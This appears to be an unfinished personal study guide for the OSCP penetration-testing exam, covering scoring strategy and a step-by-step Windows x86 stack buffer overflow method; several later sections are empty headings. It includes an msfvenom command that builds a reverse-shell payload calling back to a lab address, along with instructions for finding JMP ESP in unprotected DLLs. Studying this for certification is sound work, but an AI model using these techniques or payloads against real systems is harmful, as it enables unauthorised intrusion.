# OSCP Exam Process

## Exam Approach

Overview:
* 1 x 25 points (Buffer Overflow)
* 1 x 10 points (Metasploit box)
* 2 x 20 points
* 1 x 25 points

Approaches - there are a number of ways to get the passing 70 points:
1. Buffer Overflow box
2. Metasploit box
3. Either:
    * 35pts + (1 x root) + (1 x low_priv) + (1 x low_priv)
    * 35pts + (2 x root)
    * After 35pts: You need to get root on a 20pt box
    * After 55pts: You need to get 2 x low_priv shells || 1 x root shells

Tips:
* !! STICK TO PROCESS !!
* Keep notes on steps that you have taken + info gathered so far on machines. It helps you keep track of where you are.
* Enumerate ALL services even if you think you see an attack vector:
    * Build a prioritised list of of attack vectors, spanning all ports then proceed to attack.
* Take 10-15 minute breaks every 3 hours
* Have pre-compiled exploits
* Have pre-formatted exam report (with steps etc.)

If you can't get low-level priv:
* Enumerate more / Google a way to enumerate the service differently.
* Think of what has been enumerated and how you can chain to get shell or sesnsitive info.
* Read the exploit you're sending and see if it needs to be edited.

## Buffer Overflow - Windows x86

Some BO guides:
* https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/

__Fuzzing -> Determine exact offset -> Control EIP register__

1. Fuzz application to determine rough amount of bytes to cause a crash.
2. Generate offset-discovery string: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700`
3. Run script with-offset discovery string + look at value in EIP
    * EIP is where we want to store address of a JMP ESP instruction
    * Execution flow: EIP -> JMP ESP -> ESP (shellcode location)
3. Calculate offset: `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q [value in EIP]`

Now we know the exact #bytes needed to reach/control the EIP register so that we can overwrite it with JMP ESP address.

__Checking for bad chars__

1. Generate string of bad characters (0x00 -> 0xFF)
2. Use list of bad chars as payload + execute script.
3. Observe crash + goto location in ESP register (right-click -> follow-in-dump)
4. Observe the hex dump and see which character has truncated the rest of the payload that should come after it.
5. Remove character from buffer + repeat steps until all bad chars have been found.

__Find address of a JMP ESP in a DLL__

We need to find a module that contains a `JMP ESP` instruction which we can point to.

1. `!mona modules` to list all the loaded modules for the application.
2. Find a module that has no internal security mechanisms:
   * No memory protection (ASLR: address randomisation / DEP: data execution prevention)
   * Memory range of DLL does not contain bad characters
3. Find a `JMP ESP` or equivalent instruction in the DLL.
   * Click on the Executable Modules `e` icon to show list of all modules/DLLs loaded with the application.
   * Locate the chosen DLL in step #3 and click on the DLL.
   * Right-click on instruction window -> Search For -> Command -> `JMP ESP`
   * If none are found: Search For -> Command Sequence -> `PUSH ESP | RETN` (equivalent command)
   * If none are found: `!Mona find -s "\xFF\xE4" -m slmfc.dll` to find the opcode for `JMP ESP` in the whole slmfc.dll.
4. Once `JMP ESP` has been found, verify that the address does actually contain the instruction
   * Click on "Go to address in disassembler" button then enter in the address.
   * Check that the address has `JMP ESP`

__Generate and use shellcode__

1. Generate shellcode, target specific platform (windows x86), encode payload, avoid bad characters
   `$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.42 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai`
   In front of the shellcode are instructions to decode the encoded payload.
2. We need to provide the shellcode docoder some stack-space to work with
   * Append NOP instructions to the front of the payload e.g. `"\x90 * 16"`
3. 


## Buffer Overflow - Linux



## Entry Point

__#1 RECON__

* Scan ports
* Scan ALL ports

__#2 __

__Step 3__

__Step 4__




## Windows Privilege Escalation

__Step 1__

__Step 2__

__Step 3__

__Step 4__


## Linux Privilege Escalation

__Step 1__

__Step 2__

__Step 3__

__Step 4__

